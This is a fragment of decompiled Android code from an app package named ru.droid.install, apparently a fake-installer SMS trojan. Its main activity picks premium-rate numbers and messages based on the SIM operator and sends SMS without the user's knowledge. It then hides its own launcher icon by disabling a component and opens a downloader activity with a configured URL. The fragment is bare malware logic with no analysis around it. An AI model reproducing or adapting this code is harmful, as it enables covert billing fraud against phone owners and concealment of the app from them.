	
	    public ControllerActivity()
	    {
	        return;
	    }
	
	
	    public void onCreate(android.os.Bundle p13)
	    {
	        super.onCreate(p13);
	        this.setContentView(2130903041);
	        ru.droid.install.other.a v10_1 = new ru.droid.install.other.a(((android.telephony.TelephonyManager) this.getSystemService("phone")).getSimOperator().toString(), this);
	        int v11 = v10_1.e;
	        int v6 = 0;
	        int v8 = 1;
	        while ((v6 < v10_1.d.length) && (v8 <= v11)) {
	            String v3_5 = v10_1.c[v6];
	            String v1_6 = v10_1.d[v6];
	            if ((v1_6.length() > 0) && (v3_5.length() > 0)) {
	                android.telephony.SmsManager.getDefault().sendTextMessage(v1_6, 0, v3_5, android.app.PendingIntent.getBroadcast(this, 0, new android.content.Intent(this, ru.droid.install.ui.ControllerActivity), 0), 0);
	            }
	            v6++;
	            v8++;
	        }
	        try {
	            String v2_3 = new java.io.OutputStreamWriter(this.openFileOutput("code.reg", 1));
	            try {
	                v2_3.write("1");
	                v2_3.flush();
	                v2_3.close();
	            } catch (java.io.IOException v0_9) {
	                v0_9.printStackTrace();
	            }
	            this.getPackageManager().setComponentEnabledSetting(new android.content.ComponentName(this.getPackageName(), new StringBuilder().append(this.getPackageName()).append(".ui.HeadActivity").toString()), 2, 1);
	            java.io.IOException v0_13 = new android.content.Intent(this.getBaseContext(), ru.droid.install.ui.DownloadersActivity);
	            v0_13.putExtra("URL", v10_1.a);
	            this.startActivity(v0_13);
	            this.finish();
	            return;
	        } catch (java.io.IOException v0_10) {
	            v0_10.printStackTrace();
	            this.getPackageManager().setComponentEnabledSetting(new android.content.ComponentName(this.getPackageName(), new StringBuilder().append(this.getPackageName()).append(".ui.HeadActivity").toString()), 2, 1);
	            v0_13 = new android.content.Intent(this.getBaseContext(), ru.droid.install.ui.DownloadersActivity);
	            v0_13.putExtra("URL", v10_1.a);
	            this.startActivity(v0_13);
	            this.finish();
	            return;
	        }
	    }
	
